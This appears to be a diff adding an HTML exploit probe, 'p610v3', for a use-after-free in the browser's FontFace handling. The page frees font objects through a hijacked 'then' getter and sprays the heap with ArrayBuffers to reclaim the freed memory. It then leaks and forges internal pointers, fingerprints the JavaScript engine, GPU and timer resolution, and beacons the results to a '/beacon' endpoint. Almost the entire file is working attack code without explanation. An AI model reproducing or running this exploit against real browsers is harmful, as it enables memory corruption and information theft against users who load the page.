@@ -1,0 +1,231 @@
+<!--
+  p610v3: Two-phase FontFace UAF + code pointer extraction.
+  Based on working v4i probe with post-survival analysis appended.
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p610v3</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Arial);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P610-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var stage=0;
+var lane1=null, hit1=-1, T1_lo=0, T1_hi=0;
+var lane2=null, hit2=-1;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P1-FREE');
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P1-SPRAY:'+lane1.length);
+    return;
+  }
+  if(stage===2){stage=3;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P2-FREE');
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P2-SPRAY:'+lane2.length);
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('BOOT');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase 1: find hit at 200ms
+setTimeout(function(){
+  if(!lane1){b('P1:NO-SPRAY');return;}
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('P1:NO-HIT');return;}
+  var v=lane1[hit1];
+  T1_lo=rD(v,0x58); T1_hi=rD(v,0x5C);
+  b('P1:HIT:lane='+hit1+',rc='+rD(v,0)+',T1=0x'+rQ(v,0x58));
+  b('P1:W1=0x'+rQ(v,0x68));
+  wD(v,0x58,0); wD(v,0x5C,0);
+  // null +0x60..+0x6F too
+  for(var k=0x60;k<0x70;k++) v[k]=0;
+  b('P1:NULLED');
+}, 200);
+
+// GC1 at 600ms
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P1:GC-DONE');
+}, 600);
+
+// Phase 2 trigger at 1200ms
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:POST-GC:rc='+rD(lane1[hit1],0));
+  stage=2;
+  var pb=new FontFace('pb','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+  b('P2:STARTED');
+}, 1200);
+
+// Phase 2: find hit, redirect at 1700ms
+setTimeout(function(){
+  if(stage<3){b('P2:NO-TRAP');return;}
+  if(!lane2){b('P2:NO-SPRAY');return;}
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit2=i; break; }
+  }
+  if(hit2<0){b('P2:NO-HIT');return;}
+  var v=lane2[hit2];
+  b('P2:HIT:lane='+hit2+',rc='+rD(v,0)+',T2=0x'+rQ(v,0x58));
+  b('P2:W2=0x'+rQ(v,0x68));
+  var forge_lo=T1_lo-0x50, forge_hi=T1_hi;
+  if(forge_lo<0){forge_lo+=0x100000000;forge_hi-=1;}
+  wD(v,0x58,forge_lo>>>0); wD(v,0x5C,forge_hi);
+  b('P2:REDIRECT:+58=0x'+rQ(v,0x58));
+}, 1700);
+
+// GC2 at 2200ms
+setTimeout(function(){
+  if(hit2<0) return;
+  b('P2:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P2:GC-DONE');
+}, 2200);
+
+// Survival check + code pointer extraction at 3000ms
+setTimeout(function(){
+  if(hit2<0){b('FAIL');return;}
+  var v=lane2[hit2];
+  var rc=rD(v,0);
+  b('POST-GC2:rc='+rc);
+  if(rc!==2){b('FAIL:rc='+rc);return;}
+  b('SURVIVED');
+
+  /* A: Error().stack */
+  try{
+    function innerA(){throw new Error('probe');}
+    try{innerA();}catch(e){
+      var st=e.stack||'';
+      for(var c=0;c<st.length;c+=400) b('A-STACK:'+st.substring(c,c+400));
+    }
+  }catch(e2){b('A-ERR:'+e2.message);}
+
+  /* B: Function.toString on built-ins */
+  try{
+    var fns=['eval','parseInt','parseFloat','Object','Array','Function',
+             'ArrayBuffer','DataView','JSON','Math','Promise','Map','Set'];
+    for(var fi=0;fi<fns.length;fi++){
+      try{
+        var fn=self[fns[fi]];
+        if(fn) b('B-FN:'+fns[fi]+'='+Function.prototype.toString.call(fn).substring(0,120));
+      }catch(e3){}
+    }
+  }catch(e4){b('B-ERR:'+e4.message);}
+
+  /* C: Feature detection */
+  try{
+    b('C-WASM:'+(typeof WebAssembly));
+    b('C-SAB:'+(typeof SharedArrayBuffer));
+    b('C-WORKER:'+(typeof Worker));
+    b('C-PERF-NOW:'+performance.now());
+    try{b('C-PERF-MEM:'+(typeof performance.memory));}catch(e){}
+  }catch(e5){b('C-ERR:'+e5.message);}
+
+  /* D: WebGL renderer strings */
+  try{
+    var glc=document.createElement('canvas');
+    var gl=glc.getContext('webgl')||glc.getContext('experimental-webgl');
+    if(gl){
+      b('D-VENDOR:'+gl.getParameter(gl.VENDOR));
+      b('D-RENDERER:'+gl.getParameter(gl.RENDERER));
+      b('D-VERSION:'+gl.getParameter(gl.VERSION));
+      var dbg=gl.getExtension('WEBGL_debug_renderer_info');
+      if(dbg){
+        b('D-UV:'+gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
+        b('D-UR:'+gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
+      }
+    } else b('D-NOGL');
+  }catch(e6){b('D-ERR:'+e6.message);}
+
+  /* E: MessageChannel structured clone */
+  try{
+    if(typeof MessageChannel!=='undefined'){
+      var ab1=new ArrayBuffer(192);
+      var mc=new MessageChannel();
+      var t0=performance.now();
+      mc.port1.postMessage(ab1,[ab1]);
+      var t1=performance.now();
+      b('E-CLONE:'+(t1-t0).toFixed(4)+'ms,detached='+(ab1.byteLength===0));
+    } else b('E-NO-MC');
+  }catch(e7){b('E-ERR:'+e7.message);}
+
+  /* F: Window property scan for debug/internal objects */
+  try{
+    var wkeys=Object.getOwnPropertyNames(self);
+    b('F-WKEYS:'+wkeys.length);
+    for(var wi=0;wi<wkeys.length;wi++){
+      var wk=wkeys[wi];
+      if(/debug|internal|webkit|memory|gc|heap|addr|jsc/i.test(wk)) b('F-HIT:'+wk);
+    }
+    try{if(typeof $vm!=='undefined') b('F-VM:YES');}catch(e){}
+    try{if(typeof $jsc!=='undefined') b('F-JSC:YES');}catch(e){}
+    try{if(typeof gc!=='undefined') b('F-GC:'+typeof gc);}catch(e){}
+    try{if(typeof internals!=='undefined') b('F-INTERNALS:YES');}catch(e){}
+  }catch(e8){b('F-ERR:'+e8.message);}
+
+  /* G: Scan both hit buffers — full qword dump of non-zero */
+  try{
+    var scanBuf=function(v,label){
+      for(var off=0;off<192;off+=8){
+        var q=rQ(v,off);
+        if(q!=='0000000000000000') b(label+':+'+('00'+off.toString(16)).slice(-2)+'=0x'+q);
+      }
+    };
+    scanBuf(lane1[hit1],'G-BUF1');
+    scanBuf(lane2[hit2],'G-BUF2');
+  }catch(e9){b('G-ERR:'+e9.message);}
+
+  /* H: Timing resolution */
+  try{
+    var times=[];
+    for(var ti=0;ti<20;ti++) times.push(performance.now());
+    var deltas=[];
+    for(var ti=1;ti<times.length;ti++) deltas.push((times[ti]-times[ti-1]).toFixed(6));
+    b('H-DELTAS:'+deltas.join(','));
+  }catch(e10){b('H-ERR:'+e10.message);}
+
+  b('DONE');
+}, 3000);
+}
+
+setTimeout(main,0);
+</script></head><body>p610v3</body></html>
